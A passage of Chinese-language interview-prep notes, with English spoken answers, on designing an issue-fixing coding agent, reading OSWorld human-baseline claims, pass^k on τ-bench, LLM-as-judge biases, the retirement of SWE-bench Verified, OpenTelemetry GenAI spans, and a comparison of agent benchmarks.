**现有笔记：** [06c](06c-ai-sd-question-bank.md) Q3 AI 编程助手已有主循环（loop，计划 → 改 → 沙箱跑测试 → 读失败 → 修）、上下文来源、沙箱、"改了测试本身"等失败处理；[06 §2.7](06-ai-system-design.md#s2-7) 讲防护；[06 框架、手写循环、还是 Temporal](06-ai-system-design.md#h53) 讲长任务编排（orchestration）。本题扩展成完整的系统设计。

**答案要点**
1. **先澄清需求**：哪些仓库、哪些语言？只处理打了标签（比如 `agent-fix`）的 issue，还是全部？每天多少个？有没有可靠的测试？谁审 PR？成本上限多少？
2. **组件和数据流**：
   - ① **触发**：GitHub App 收 webhook（issue 被打标签或被指派）。只有有写权限的人能触发。
   - ② **分诊（triage）**：用小模型（small model）判断这个 issue 能不能自动修（是不是 bug、信息够不够、改动范围），不合适就评论说明原因并退出。
   - ③ **任务队列（queue） + 持久化（persistence）编排器（orchestrator）**：每个 issue 一个任务，状态存数据库（或 Temporal），失败可恢复。
   - ④ **沙箱池**：每个任务一个临时容器（ephemeral container），预装依赖和构建缓存（cache）；没有生产凭证；出网只允许包仓库（egress allowlist）；任务结束就销毁。
   - ⑤ **上下文**：仓库的 AGENTS.md、代码搜索（ripgrep 加符号索引）、相关文件、issue 正文和评论。**issue 正文是不可信输入**，只当数据，不当指令。
   - ⑥ **agent 循环**：复现（reproduce） → 先写一个能复现问题的失败测试 → 改代码 → 跑测试、lint、类型检查 → 读失败 → 再修。工具按 ACI 原则设计：带行号读文件、带语法检查的编辑、有上限的搜索。
   - ⑦ **验证器**：新写的复现测试从失败变通过（fail-to-pass），原有测试保持通过（pass-to-pass）；静态检查和安全扫描；另一个模型做 diff 审查（只当辅助）。
   - ⑧ **提 PR**：git 凭证不进沙箱，由外部代理加真实 token，并限制只能推到 `agent/` 前缀（prefix）的分支；PR 正文写根因（root cause）、改动、测试证据、置信度（confidence）；标成草稿（draft）。
   - ⑨ **人工评审和反馈**：人审通过才合并；评审意见会再触发一轮修改（有轮数上限）。
3. **关键取舍**：
   - **测试是验证器，也是被钻空子的对象**：默认禁止修改已有测试，或者改了就单独标红让人看；验证用的测试命令由系统决定，不由 agent 决定。
   - **多次尝试**：可以并行（parallel）跑 N 个候选，用测试结果选最好的。成功率（success rate）更高，成本也是 N 倍；先用 N = 1，只对高价值 issue 开多候选。
   - **自主度**：只读调查和写代码都在沙箱里；推送、开 PR 由系统组件做，不交给模型。
4. **限制和预算**：
   - 每个任务有最大步数、最大 token 和墙钟时间（参考值：GitHub Copilot 云端 agent 的单次会话上限是 59 分钟）。
   - 同一个测试连续失败 3 次就停。
   - 停下来时在 issue 下评论：查到了什么、试了什么、卡在哪里。这本身就有价值。
5. **规模估算（estimation，推算，数字全为假设）**：
   - 每天 2,000 个 issue，分诊放行 30% ⇒ 600 个任务/天。
   - 每个任务平均 40 轮，每轮输入约 30k token（大部分命中缓存）、输出约 1k ⇒ 每任务约 1.2M 输入、40k 输出 token，每天约 7.2 亿输入 token、2,400 万输出 token。
   - 平均每个任务 20 分钟 ⇒ 600 × 20 / (24 × 60) ≈ 8.3 个并发（concurrency）沙箱，按 3 倍峰值（peak）准备约 25 个。
   - 再乘官方单价得到日成本（单价面试前查）。
6. **指标**：自动修复 PR 的合并率、合并后被回滚（rollback）的比例、人工评审时间、每个合并 PR 的成本、分诊准确率（放进来的任务里有多少真能修）。用历史上已关闭的 issue 和对应修复 commit 做离线评测（offline evaluation）集。

**English answer (speakable, ~45–75 s):**
> A GitHub App receives the webhook when someone with write access labels an issue. A cheap triage model decides if it's fixable; if not, it comments and exits. Eligible issues become durable tasks, each with an ephemeral sandbox container: dependencies preinstalled, no production credentials, and egress limited to package registries. The agent first reproduces the bug with a failing test, then iterates on edits, running tests, lint and type checks, with tools designed for the model: line-numbered file views, linted edits and capped search. I treat the issue text as untrusted data, because it's a prompt-injection channel. Verification is fail-to-pass on the new test and pass-to-pass on the existing suite, plus static and security scans. Editing existing tests is blocked or flagged. Pushing is done by a proxy outside the sandbox that only allows an agent branch prefix, and the PR is a draft that a human must approve. Each task has step, token and time caps; on failure it comments with what it tried. I'd measure merge rate, revert rate, review time and cost per merged PR.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 怎么防止 issue 里的提示注入？ | issue 当数据；沙箱无凭证、出网白名单；推送和开 PR 由系统做；提 issue 的人不能批准 PR（GitHub Copilot 也是这样规定的），PR 里的 workflow 要人批准后才运行。 | "Issue text is data; the sandbox has no credentials and a locked-down egress; pushes are done by the system; the requester can't approve the PR, as GitHub does for its agent, and CI workflows on agent PRs need human approval to run." |
| 仓库没有好的测试怎么办？ | 降低自主度：只做调查和建议补丁，或者先让 agent 补测试（由人审），等验证器可靠了再放开自动修复。 | "Lower the autonomy: investigate and suggest a patch, or have the agent add tests first under human review, and only automate fixes once the verifier is trustworthy." |

**坑**
- 让 agent 自己决定跑哪些测试、自己推送、自己合并。验证命令、推送和合并都要由系统控制。
- 只看"测试通过"就认为修好了。没有复现测试的话，测试通过可能只说明没测到。
- 忽略成本和并发估算。系统设计题要给出量级，并标明是推算。

**来源：** [GitHub Docs – About Copilot coding agent](https://docs.github.com/en/copilot/concepts/agents/coding-agent/about-coding-agent)、[GitHub Docs – Risks and mitigations for Copilot coding agent](https://docs.github.com/en/copilot/concepts/agents/coding-agent/risks-and-mitigations)、[arXiv 2405.15793 – SWE-agent](https://arxiv.org/abs/2405.15793)、[Anthropic – Claude Code sandboxing（git 凭证代理）](https://www.anthropic.com/engineering/claude-code-sandboxing)

---

### Q59 · 你怎么看"OSWorld 上 Agent 已经追上人类基线"这件事？ <a id="q59"></a> [↑ 目录](#toc)

**English question:** What's your take on the claim that agents have caught up with the human baseline on OSWorld?
（难度：开放 · 题目后半句按截断前文补全）

**现有笔记：** [06 两个完整案例](notes/06-case-studies.md) B 部分 WebVoyager 案例讲了网页 agent 的 grounding、评估方法和失败分类；[06c](06c-ai-sd-question-bank.md) Q17 浏览器 agent 讲循环检测、完成前校验（validation）、高风险动作人工确认（human confirmation）。OSWorld 基线本题新补。

**答案要点**
1. **OSWorld 是什么**：2024 年的基准，在真实的 Ubuntu 桌面上做 369 个开放任务（跨应用、文件操作等），agent 只能通过截图和键盘鼠标操作，由脚本检查最终状态是否正确。
2. **人类基线（human baseline） 72.36% 是怎么来的**：
   - 标注者（annotators）是计算机专业的大学生，有基本软件使用能力，**之前没见过这些任务和软件**。
   - 人类完成一个任务的中位时间约 112 秒。
   - 论文发布时最好的模型只有 12.24%，主要卡在 GUI 定位（grounding：准确找到该点击的位置）和操作知识。
3. **谁、什么时候追上的**：
   - 2025-12-16：Simular 的 Agent S 报告在 OSWorld 上达到 72.6%。用的是 Behavior Best-of-N（多个 agent 各跑一次，选最好的结果），不是单次运行。
   - 2026-03-05：OpenAI 报告 GPT-5.4 在 OSWorld-Verified 上达到 75.0%，称超过人类的 72.4%（引用的就是原论文那个基线）。这是 OpenAI 官方明确写出“超过人类表现”的单模型结果。
   - 未核实：二手报道称 Anthropic 的 Sonnet 4.6（2026-02-17）在 OSWorld-Verified 上约 72.5%，但官方页面的数字只在图里，我没能从文字核实，所以“哪个单模型第一个越线”不下结论。
   - OSWorld-Verified 是 2025-07-28 发布的修订版，修复了社区报告的任务问题，Anthropic 称它是原版的"原地升级"。
4. **为什么要打折扣**：
   - **版本不同**：人类基线是在原版 OSWorld 上测的，模型分数大多来自 Verified 版。
   - **基线不是专家**：基线来自第一次接触这些软件的学生，不是熟练用户；Anthropic 发布 Sonnet 4.6 时也说模型仍落后于最熟练的人。
   - **只比成功率**：不比速度、成本、步数，也不比 pass^k（同一任务连跑 k 次都成功的概率，衡量稳定性）。
   - **best-of-N 这类做法**需要能挑出最好结果的手段，真实场景里未必有。
   - **基准是封闭环境**：没有弹窗、登录、验证码、提示注入、不可逆操作这些真实世界的长尾。
5. **我的结论**：这是能力上的里程碑，说明 GUI grounding 已经不是主要瓶颈。上线时的问题变成可靠性、安全和成本：高风险动作要确认、完成状态要由代码校验、网页内容一律当不可信数据。要用自己的任务集测成功率、pass^k、每任务成本和耗时，再决定给多大自主度。

**English answer (speakable, ~45–75 s):**
> It's a real milestone, but I'd read the fine print. OSWorld's human baseline of about 72% came from computer-science students who hadn't seen the tasks or the apps before, taking around two minutes per task, on the original benchmark. Simular reported crossing it in December 2025 with a best-of-N approach that runs several agents and picks one. GPT-5.4 reported 75% on OSWorld-Verified in March 2026, which is a revised version of the benchmark, compared with that same original human number. So it's not quite apples to apples, and it only compares success rate: not speed, not cost, and not reliability across repeated runs. What it does tell me is that GUI grounding is no longer the main blocker. The deployment questions are now reliability, safety and cost. Real desktops have logins, pop-ups, CAPTCHAs, prompt injection in page content, and irreversible actions. So I'd still verify completion with code, require confirmation for risky actions, and measure pass^k and cost per task on my own workload before granting autonomy.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 换成你来评估一个 computer-use agent，看什么？ | 按结果判断的成功率、pass^k、平均步数和耗时、每任务成本、误报完成率、高风险动作拦截率。用自己的任务，不只看公开榜单。 | "Outcome-based success, pass^k, steps and wall time, cost per task, false-completion rate and how often risky actions were caught, on my own tasks rather than only the public leaderboard." |
| 为什么 best-of-N 在线上难用？ | 要有可靠的选择器挑出正确的那次；而且 N 次在真实系统上执行可能产生 N 次副作用，只有在可回滚的沙箱里才安全。 | "You need a reliable selector, and N real executions can mean N side effects, so it's only safe in a resettable sandbox." |

**坑**
- 说"AI 电脑操作已经超过人类"。准确说法是：在一个特定基准上，超过了一个特定的非专家基线，而且版本不完全一致。
- 混用 72.36%（原论文）和 72.4%（OpenAI 四舍五入的写法），以为是两个不同的基线。它们是同一个。
- 网上流传的其他模型"85% / 83.5%"之类分数，没有查到一手来源，不要引用。

**来源：** [arXiv 2404.07972 – OSWorld](https://arxiv.org/abs/2404.07972)、[OSWorld 项目页](https://os-world.github.io)、[OSWorld GitHub（2025-07-28 OSWorld-Verified 更新）](https://github.com/xlang-ai/OSWorld)、[Simular – Agent S outperforms humans on OSWorld](https://www.simular.ai/articles/simulars-computer-use-agent-outperforms-humans)、[OpenAI – Introducing GPT-5.4](https://openai.com/index/introducing-gpt-5-4/)、[Anthropic – Introducing Claude Sonnet 4.6](https://www.anthropic.com/news/claude-sonnet-4-6)


## 模块 K：评测与可观测性 <a id="mk"></a> [↑ 目录](#toc)

### Q60 · 为什么 Agent 评测要看 pass^k 而不只是 pass@k？τ-bench 是怎么定义和测出来的？ <a id="q60"></a> [↑ 目录](#toc)

**English question:** Why should agent evaluation look at pass^k instead of only pass@k? How does τ-bench define it, and what did it find?
（难度：必考 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.6](06-ai-system-design.md#s2-6) 讲了评测（evaluation, eval）分层（离线 golden set、组件级、轨迹（trajectory）级、结论级）；[06 回归测试](06-ai-system-design.md#h31) 讲了每条样本重复跑 3–5 次、配对比较和置信区间（confidence interval）。两处都没讲 pass^k，本题补上。

**答案要点**
1. **两个指标的定义。**
   - pass@k：同一题跑 k 次，**至少一次**成功的概率。适合"人可以挑一个能用的"场景，比如代码补全给 k 个候选。
   - pass^k（读作 pass hat k）：同一题跑 k 次，**k 次全部**成功的概率。衡量可靠性（reliability），也就是"每次都对"。
   - k 增大时，pass@k 只会上升，pass^k 只会下降。
2. **τ-bench 的估计方法。** 每题跑 n 次，其中成功 c 次，pass^k = E_task[ C(c,k) / C(n,k) ]，再对所有题取平均。
   - 关键是**先按题算、再平均**。
   - 不能用总体成功率（success rate） p 直接算 p^k。p^k 只在每题成功率都相同时才成立：有的题稳定对、有的题稳定错时，p^k 会低估；有的题时对时错时，p^k 会高估。
3. **τ-bench 怎么测。** 模拟用户（user simulator）是一个 LLM 扮演的顾客；agent 按领域政策（domain policy）调用 API 改数据库（database）。
   - 打分不看对话内容，看**最终数据库状态**是否等于标注（annotated）的目标状态。
   - 论文结果：gpt-4o 的 pass^1 在 retail 是 61.2%，在 airline 是 35.2%；retail 的 pass^8 低于 25%。
4. **为什么 agent 更该看 pass^k。** 客服、下单这类面向用户的 agent，一个用户只有一次机会，第 3 次做错就是一次事故。
   - 举例：单次成功率 0.8 的题，pass^5 = 0.8^5 ≈ 0.33（推算，假设每次独立）。
   - Anthropic 2026-01 的评测文章也是这么分的：pass@k 适合"一次成功就够"的工具；pass^k 适合需要稳定结果的面向客户的 agent。
5. **τ²-bench**（2025-06）加了 telecom 领域，引入"双控"（dual-control）：用户也能操作环境，agent 要指导用户动手，更接近真实客服。

**English answer (speakable, ~45–75 s):**
> pass@k asks "did at least one of k tries succeed", which fits cases where a human picks the best candidate, like code suggestions. pass^k asks "did all k tries succeed", which is reliability, and that's what matters for a customer-facing agent, because each user only gets one run. τ-bench, from Sierra, simulates a customer with an LLM, lets the agent call domain APIs under a written policy, and grades the final database state against the goal state. You run each task n times and estimate pass^k per task, then average. The headline finding was that gpt-4o succeeded on roughly 61% of retail tasks on a single try, but pass^8 dropped below 25%. So an agent that looks good on one run can be quite unreliable. In my evals I report pass^1 and pass^k side by side, sliced by task type.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| How many runs per task do you need? | n 至少要 ≥ k；n 越大，C(c,k)/C(n,k) 的方差越小。成本按 n × 题数涨，所以 smoke 集用小 n，发布前用大 n | "n has to be at least k, and more runs reduce variance. I use a small n on the per-commit smoke suite and a larger n before release." |
| Why grade the end state instead of the conversation? | 状态比对是确定性的，不需要 LLM 评委；也允许 agent 用不同路径到达同一个正确结果 | "End-state checks are deterministic and don't need a judge, and they accept any valid path to the right outcome." |

**坑**
- 把 pass^k 写成 p^k，只用总体成功率估算（estimation）。正确做法是先按题估计、再平均。
- 混淆 pass@k 和 pass^k，比如有些二手总结把 τ²-bench 的 pass^k 写成 pass@k。
- 只跑一次就上线。温度设成 0 也不保证输出可复现（reproducible），见 [06 解码策略](06-ai-system-design.md#h46)。

**来源：** [τ-bench (arXiv 2406.12045)](https://arxiv.org/abs/2406.12045)、[τ-bench HTML 版（公式与表 2）](https://arxiv.org/html/2406.12045)、[τ²-Bench (arXiv 2506.07982)](https://arxiv.org/abs/2506.07982)、[Anthropic: Demystifying evals for AI agents (2026-01-09)](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)

---

### Q61 · LLM-as-judge 怎么用才靠谱？它有哪些已知偏差？ <a id="q61"></a> [↑ 目录](#toc)

**English question:** How do you use LLM-as-a-judge reliably, and what are its known biases?
（难度：核心）

**现有笔记：** [06 §2.6](06-ai-system-design.md#s2-6) 的 LLM-as-judge 一行列了位置偏差（position bias）、长度偏差（length bias）、自我偏好（self-preference bias），并给了五步人工校准（calibration）流程；[06c Q5](06c-ai-sd-question-bank.md) 讲了评测平台里规则打分器、LLM 评委（judge）、人工三层怎么分工。本题补论文出处和使用细则。

**答案要点**
1. **LLM 评委（LLM-as-a-judge）**：用一个模型按评分细则（rubric）给另一个模型的输出打分或做两两比较。出处是 MT-Bench 论文《Judging LLM-as-a-Judge》（2023）。
   - 论文结论：强评委（GPT-4）和人类偏好的一致率超过 80%，和人与人之间的一致率相当。
2. **论文点名的四种局限。**
   - **位置偏差（position bias）**：两两比较时偏爱某个位置的答案。
   - **冗长偏差（verbosity bias）**：偏爱更长的答案。
   - **自我增强偏差（self-enhancement bias）**：偏爱自己或同家族模型生成的答案。
   - **推理能力有限（limited reasoning ability）**：评数学题、推理题时，评委自己也会算错。
3. **怎么用才靠谱（按优先级）。**
   - ① **能用代码判的不用评委**：数据库状态、schema 校验（validation）、单元测试（unit test）、引用（citation） ID 是否存在。
   - ② 评分细则写成**多个二元判断**，例如"是否引用了订单号""是否承诺了政策外的赔偿"，不要只给一个 1–10 的总分。
   - ③ 提供参考答案或证据，让评委先写理由再给分。
   - ④ 两两比较时**交换顺序各评一次**，两次结论不一致就记为平局。
   - ⑤ 评委用**另一家族的模型**，避免自我增强偏差。
4. **用人工标注校准。** 人工标 100–200 条样本，算一致率或 Cohen's kappa（扣除碰巧一致后的一致程度）。
   - 一致率不达标就改细则，再测。
   - **换评委模型或改细则都要重新校准**；把评委的提示和模型版本化。
   - 定期抽查评委的打分记录（transcript）。Anthropic 的评测文章明确说：不读打分记录，就不知道评委是否在误判正确答案。
5. **高风险判断不单靠评委**：安全违规、写操作（write operation）是否正确用硬门禁加人工复核。评委只负责主观质量。

**English answer (speakable, ~45–75 s):**
> I treat the judge as a measuring instrument that needs calibration. First, anything I can check in code, I check in code: end state, schema, tests, whether a cited ID exists. For the subjective part, I write the rubric as several yes-or-no criteria with a reference answer, and I ask the judge to reason before scoring. The MT-Bench paper documented position bias, verbosity bias, self-enhancement bias, and weak reasoning on math, so I swap answer order and count disagreement as a tie, use a judge from a different model family, and penalize length that isn't needed. Then I calibrate against a few hundred human labels using agreement or Cohen's kappa, and I recalibrate whenever the judge model or the rubric changes. Safety-critical checks never rely on the judge alone.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| Pairwise or absolute scoring? | 比较两个版本时用两两比较，更稳定，但要处理位置偏差；跟踪长期趋势用带细则的绝对分 | "Pairwise for comparing two versions, because it's more stable; rubric-based absolute scores for tracking trends over time." |
| What if judge and humans disagree a lot? | 先看分歧集中在哪些细则；改细则或拆细；还不行就那一项改回人工评，或换更强的评委 | "I look at which criteria disagree, rewrite or split them, and if that fails, keep that criterion human-graded." |

**坑**
- 说"LLM 评委和人一样准"却不给校准数据。论文的 80% 一致率是 MT-Bench 那个设定下的结果，不能直接搬到你的领域。
- 只用一个 1–10 的总分，没有细则；或者用被测模型自己当评委。
- 换了评委模型，却拿新分数和历史分数直接比较。

**来源：** [Zheng et al., Judging LLM-as-a-Judge with MT-Bench and Chatbot Arena (arXiv 2306.05685)](https://arxiv.org/abs/2306.05685)、[Anthropic: Demystifying evals for AI agents](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)

---

### Q62 · OpenAI 为什么在 2026 年不再报告 SWE-bench Verified？换成了什么，对我们自己做评测有什么启示？ <a id="q62"></a> [↑ 目录](#toc)

**English question:** Why did OpenAI stop reporting SWE-bench Verified in 2026, what did it recommend instead, and what does that teach us about building our own evals?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** 无，本题新补。基准（benchmark）的生命周期和"golden 会过时"在 [06 回归测试](06-ai-system-design.md#h31) 里有一句。

**答案要点**
1. **时间和出处。** OpenAI 博客《Why we no longer evaluate SWE-bench Verified》。
   - 日期 2026-02-23，取自检索结果对该页的摘要；页面本身返回 403，日期**未直接读到**，但多个转载一致。
   - 结论：OpenAI 不再报告 Verified 分数，也建议其他开发者停止报告。
2. **原因一：测试本身有缺陷。**
   - OpenAI 审计（audit）了 138 道题：o3 跑 64 次都不能稳定做对的题，占 500 题的 27.6%。每题至少 6 名资深工程师复核。
   - **至少 59.4%** 的被审计题，测试会拒绝功能上正确的提交。
   - 具体分布：35.5% 的测试过窄（narrow），强制特定实现；18.8% 的测试过宽（wide），检查题面没要求的功能；5.1% 是其他问题。
3. **原因二：训练污染（contamination）。** 被测的所有前沿模型，都能对部分题复现（reproduce）人类写的标准补丁（gold patch）或逐字复现题面。也就是说，模型训练时见过这些题，分数里混进了记忆（memorization）。
   - 6 个月里分数从 74.9% 涨到 80.9%，OpenAI 认为这段涨幅已不反映真实编码能力的提升。
4. **替代方案。**
   - 在有未污染的评测之前，报告 **SWE-Bench Pro** 公开集。OpenAI 说它"经验上污染较少"。SWE-Bench Pro 有 1,865 题，来自 41 个仓库（repository），分公开集、保留集（held-out）、商业集三部分。
   - 投资私有、由专家编写的评测（文中举了 GDPval）。
5. **对自己做评测的启示。**
   - 公开 benchmark 都有半衰期，只能用来选型。
   - 上线门禁必须用**私有的、来自自己生产流量的冻结集**，并定期刷新。
   - 定期审计"失败题"，确认是模型错还是题错。这和 Anthropic 说的"读打分记录"是同一件事。

**English answer (speakable, ~45–75 s):**
> OpenAI published a post in February 2026 saying it would stop reporting SWE-bench Verified. There were two reasons. First, they audited the 138 problems that o3 couldn't solve consistently and found that at least 59 percent had flawed tests, meaning the tests were too narrow and enforced one implementation, or too wide and checked things the issue never asked for. So correct fixes were being rejected. Second, contamination: frontier models could reproduce the gold patch or the issue text for some tasks, so score gains partly reflected memorization. They recommended SWE-Bench Pro's public set as an interim and privately authored benchmarks longer term. My takeaway is that public benchmarks are for model selection, while release gates need a private, versioned eval set drawn from my own traffic, plus regular audits of the failing cases.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| How do you keep your own eval set from being contaminated? | 测试集不进任何训练数据或 prompt 示例；dev 集和 test 集分开；定期从新流量补新题；保留一部分不公开的保留集 | "The test split never goes into prompts or training data, dev and test are separate, and I keep refreshing it from new traffic." |
| Is SWE-Bench Pro immune? | 不是。公开集照样会被训练看到；商业集和保留集的价值在于不公开 | "No. Its public split can leak too; the held-out and commercial splits are what keep it honest." |

**坑**
- 说"SWE-bench Verified 已经被官方废弃"。实际是 OpenAI 自己停报并呼吁别人停报，不是基准维护方宣布废弃。
- 把 59.4% 说成"59.4% 的 Verified 题有问题"。这个比例的分母是被审计的 138 道难题，不是全部 500 题。
- 帖子没给这一题的数字；时间以 OpenAI 原文为准，二手站有写成 2025-09 的，是错的。

**来源：** [OpenAI: Why we no longer evaluate SWE-bench Verified](https://openai.com/index/why-we-no-longer-evaluate-swe-bench-verified/)、[SWE-Bench Pro (arXiv 2509.16941)](https://arxiv.org/abs/2509.16941)

---

### Q63 · 用 OpenTelemetry 给 Agent 做可观测性，span 怎么建模？要记哪些属性？ <a id="q63"></a> [↑ 目录](#toc)

**English question:** If you instrument an agent with OpenTelemetry, how do you model the spans, and which attributes do you record?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.10](06-ai-system-design.md#s2-10) 给了一棵 trace 树示例（模型调用、工具调用（tool call）、最终结果），并列了每个 span 要记什么、哪些指标要告警（alerting）。本题补 OTel GenAI 语义约定里的标准 span 名和 `gen_ai.*` 属性。

**答案要点**
1. **基本单位。** 一次用户任务对应一条 trace（链路）；每一步是一个 span（片段）；span 组成一棵树。
   - OTel 的 GenAI 语义约定（semantic conventions：统一规定字段叫什么名字）现在放在独立仓库 `semantic-conventions-genai`。
   - 所有相关定义都还是 **Development（开发中）** 状态，字段名可能变化，要锁定版本。
2. **标准 span 类型（2026-11 查证）。**

| 操作 `gen_ai.operation.name` | span 名格式 | span kind |
|---|---|---|
| `invoke_agent`（LLM 驱动控制流）/ `invoke_workflow`（应用定义控制流，如 LangGraph StateGraph） | `{operation} {gen_ai.agent.name}` | 进程内 INTERNAL；调用远程 agent 用 client 版本 |
| `plan`（规划或任务分解阶段，能可靠识别时才报） | `plan {gen_ai.agent.name}` | INTERNAL |
| `chat` 等推理调用 | `{operation} {gen_ai.request.model}` | CLIENT |
| `execute_tool` | `execute_tool {gen_ai.tool.name}` | INTERNAL |
| `create_agent` | `create_agent {gen_ai.agent.name}` | CLIENT |

3. **树形结构。** 根是 `invoke_agent`，下面挂 `chat` 和 `execute_tool`。子 agent 是另一个嵌套的 `invoke_agent`。
   - 规划（planning）时，生成计划的那次 LLM 调用挂在 `plan` 下面；按计划执行的工具 span 和 `plan` 是兄弟节点。
4. **关键属性。**
   - 推理调用：`gen_ai.provider.name`、`gen_ai.request.model`、`gen_ai.usage.input_tokens` / `output_tokens`、`gen_ai.usage.cache_read.input_tokens`（缓存命中的 token 数，有它就能直接算缓存命中率（hit rate））、`gen_ai.response.finish_reasons`。
   - 工具调用：`gen_ai.tool.name`、`gen_ai.tool.call.id`（模型给的调用 ID，用来对齐"模型请求了什么"和"实际执行了什么"）、`gen_ai.tool.type`。
   - 会话（session）与 agent：`gen_ai.conversation.id`、`gen_ai.agent.name`（规范要求**低基数**（low cardinality）：取值种类少，不能用请求 ID 当名字）。
   - 失败时记 `error.type`。
5. **内容和隐私。** `gen_ai.input.messages`、`gen_ai.tool.call.arguments`、`gen_ai.tool.call.result` 都是 **Opt-In（默认不采）**。
   - 也可以用 `gen_ai.input.messages_ref` 只存一个指向外部受限存储的 URI。
   - 生产默认只记参数哈希（hash），完整内容进有保留期限的受限存储，和 [06 PII](06-ai-system-design.md#h34) 一致。
6. **规范之外要自己加的。** 用自定义命名空间（如 `app.prompt.version`、`app.eval.case_id`、`app.terminal_state`）记录 prompt 版本、最终状态和事后回填的人工反馈。
   - 采样用尾部采样（tail-based sampling）：等请求结束再决定保留哪些 trace，失败的和慢的全留。
   - 长任务跨进程恢复时，用 span link（span 之间的关联引用）接上原 trace。

**English answer (speakable, ~45–75 s):**
> One user task is one trace. The root span is invoke_agent with the agent name; under it, each model call is a chat span named after the model, and each tool call is an execute_tool span named after the tool. A sub-agent is just a nested invoke_agent, and if I can clearly see a planning step I add a plan span. I follow the OpenTelemetry GenAI conventions: provider and model, input, output and cache-read token counts, finish reasons, tool name and the model's tool call ID, conversation ID, and error type. Those conventions are still marked as development, so I pin the version. Message content and tool arguments are opt-in, and I keep them off by default, logging hashes and a reference to restricted storage instead. On top of that I add my own attributes for prompt version and terminal state, use tail sampling to keep every failure, and feed failed traces into the regression set.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| Why not just log JSON? | trace 自带父子关系和耗时，能直接看出关键路径；而且有标准字段，现成的后端都能读 | "Spans give you causality and timing for free, and standard attributes work across backends." |
| How do you compute cost per task? | 按 trace 汇总每个 chat span 的输入、输出、缓存读取 token 数，乘以对应模型单价；单价表放在配置里 | "Sum token counts per trace, split into uncached, cache-read, and output, and multiply by a versioned price table." |

**坑**
- 把 `gen_ai.agent.name` 设成会话 ID 之类的高基数值，导致指标爆炸。规范明确要求低基数。
- 默认采集完整 prompt 和工具结果（tool result），日志（logs）里全是 PII。
- 说"OTel GenAI 已经是稳定标准"。现在是 Development 状态，而且文档已经搬到新仓库，旧链接 opentelemetry.io/.../gen-ai-agent-spans 只剩一个跳转说明。

**来源：** [OTel GenAI agent spans（semantic-conventions-genai 仓库）](https://github.com/open-telemetry/semantic-conventions-genai/blob/main/docs/gen-ai/gen-ai-agent-spans.md)、[OTel execute_tool span](https://github.com/open-telemetry/semantic-conventions-genai/blob/main/docs/gen-ai/execute-tool.md)、[OTel inference span](https://github.com/open-telemetry/semantic-conventions-genai/blob/main/docs/gen-ai/client-inference.md)

---

### Q64 · GAIA、BrowseComp、Gaia2、OSWorld 2.0 这些 benchmark 分别测什么？各自的局限是什么？ <a id="q64"></a> [↑ 目录](#toc)

**English question:** What do GAIA, BrowseComp, Gaia2 and OSWorld 2.0 each measure, and what are their limitations?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** 无，本题新补。

**答案要点**
1. **GAIA**（2023，Meta 等）：通用助手（general assistant）基准，466 道题。题目对人简单，但需要网页浏览、读文件、多步推理才能答。
   - 发布时人类正确率 92%，配插件的 GPT-4 只有 15%。
   - 答案是短字符串，精确匹配打分。
   - 局限：题量小、静态，可能已被训练（training）看过；只看最终答案，不看过程。
2. **BrowseComp**（OpenAI，2025-04）：1,266 道"难找、好验证"的浏览题，测持续搜索和信息拼接能力。
   - 结果：GPT-4o 0.6%；GPT-4o 加浏览 1.9%；o1 9.9%；Deep Research 51.5%。
   - 人类训练员（trainer）只解出 29.2%，70.8% 的题在两小时后放弃。
   - 局限：答案短、可验证，所以**不测**长报告的综合质量和引用质量。
3. **Gaia2**（Meta，基于 ARE 平台，2025-09）：约 1,000 个人工编写的场景，跑在一个模拟手机环境里。
   - **环境是异步（asynchronous）的**：agent 思考的时候，时间在走，新消息会进来。
   - 7 个能力切片（slice）：执行（execution）、搜索（search）、处理歧义（ambiguity）、适应变化（adaptability）、时间约束（time）、抗噪声（noise）、agent 间协作（agent-to-agent）。
   - HF 博客说执行和搜索已接近解决，时间切片对所有模型最难；论文还说预算（budget）扩展曲线会进入平台期。
4. **OSWorld 2.0**（XLANG Lab，2026，已核实存在）：108 个长程电脑操作工作流（workflow），跨桌面和网页应用；人类完成一个任务的中位时间约 1.6 小时。
   - 主指标是 500 步内是否完整完成（二元），另报部分得分。
   - 项目页上最好的是 Claude Opus 4.8：完整完成 20.6%，部分得分 54.8%。
   - 和 OSWorld 1 不是同一个基准；第三方排行榜的数字因版本（有 2.1 修订版）和测试框架（harness）不同差异很大。
5. **共同局限和用法。**
   - 都是公开集，有污染风险（见 Q62）。
   - 分数受测试框架、步数上限、推理预算影响很大，**不同框架下的分数不能直接比**。
   - 多数只报单次成功率，不报 pass^k 和成本。
   - 正确用法：按自己产品的能力需求挑基准选型，最后还是用私有集做决定。

**English answer (speakable, ~45–75 s):**
> They test different things. GAIA is short-answer general assistant questions that need browsing and tools; at launch humans scored 92% versus 15% for GPT-4 with plugins. BrowseComp is about persistent search for hard-to-find but easy-to-verify facts; Deep Research got about 51% while GPT-4o with browsing got under 2%. Gaia2 runs in an asynchronous simulated phone environment, so time passes and new events arrive while the agent thinks; it splits scores into execution, search, ambiguity, adaptability, time, noise and multi-agent collaboration. OSWorld 2.0 is 108 long computer-use workflows that take humans about an hour and a half each, and the best reported full-completion rate on its project page is around 20%. The common caveats are contamination, sensitivity to the harness and budget, and single-run scores without cost or pass^k. I use them to shortlist models, not to make the release decision.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| Which one would you use for a deep research product? | BrowseComp 测找信息的能力，但还要自己做长报告的评分细则（事实、引用、覆盖度）和来源质量评测 | "BrowseComp for retrieval persistence, plus my own rubric for report accuracy, citations, and coverage." |
| Why does async matter? | 真实世界不会等 agent：思考太久就错过时限，中途来的新信息要处理；同步基准测不出这些失败 | "The real world doesn't pause while the agent thinks; synchronous benchmarks hide deadline and interruption failures." |

**坑**
- 把 OSWorld 1 的"追上人类基线（human baseline）"套到 OSWorld 2.0 上。2.0 是新基准，顶尖模型的完整完成率在发布时只有约 20%。
